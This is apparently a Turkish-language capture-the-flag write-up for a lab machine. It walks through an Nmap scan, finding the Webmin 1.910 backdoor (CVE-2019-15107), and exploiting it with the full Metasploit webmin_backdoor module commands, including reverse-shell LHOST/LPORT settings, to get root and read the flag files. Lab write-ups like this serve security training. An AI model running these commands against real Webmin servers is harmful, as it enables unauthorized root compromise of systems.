Keşif ve Tarama
İlk adım olarak hedef sistemin açık portlarını ve çalışan servislerini tespit etmek için Nmap kullandık:

<pre>nmap -sV -sC 10.82.183.69</pre>
<img width="784" height="298" alt="image" src="https://github.com/user-attachments/assets/0f7ad260-0b01-4739-85b4-fd929f628d23" />
<br><br><br><br>

Zafiyet Araştırması
10000 portunda çalışan Webmin 1.910 sürümünde CVE-2019-15107 numaralı kritik bir zafiyet olduğunu biliyoruz. Bu zafiyet, password_change.cgi dosyasında bir backdoor içeriyor.
<img width="1227" height="795" alt="image" src="https://github.com/user-attachments/assets/92a40929-d40c-46b2-b851-750e26441a94" />

<br><br><br><br>
Exploit Uygulama
Zafiyeti istismar etmek için Metasploit Framework'ü kullandık:
<img width="1455" height="863" alt="image" src="https://github.com/user-attachments/assets/0167489e-e3ba-4536-99fd-46c11b41c9c9" />
<br><br><br><br>

Bu komutlarla Webmin backdoor'una erişim sağladık ve sistemde root yetkileri elde ettik.
<pre>msfconsole use exploit/linux/http/webmin_backdoor set RHOSTS <IP> set RPORT 10000 set SSL true set LHOST [VPN_IP_NUMARAN] set LPORT 10000 exploit</pre>
<img width="1126" height="476" alt="image" src="https://github.com/user-attachments/assets/d6b1372f-23b7-42d0-8e05-b718927f6438" />


<br><br><br><br>
Sistemdeki Kullanıcıları Bulma
Sisteme eriştikten sonra, ilk iş olarak sistemde hangi kullanıcıların olduğunu kontrol ettik:
Bu komut bize sistemdeki tüm kullanıcıları listeledi. Çıktıyı incelediğimizde dark adında bir kullanıcı olduğunu gördük.
<pre>cat /home/dark/user.txt</pre>
<img width="622" height="258" alt="image" src="https://github.com/user-attachments/assets/844a52db-af6b-4262-9a64-67538b441518" />


<br><br><br><br>
Root Flag'i Bulma
Metasploit ile zaten root yetkilerine sahip olduğumuz için, root flag'ini direkt olarak okuyabildik:
<pre>cat /root/root.txt</pre>
<img width="459" height="211" alt="image" src="https://github.com/user-attachments/assets/885362ff-9020-4f90-8163-f40b55d63ea8" />
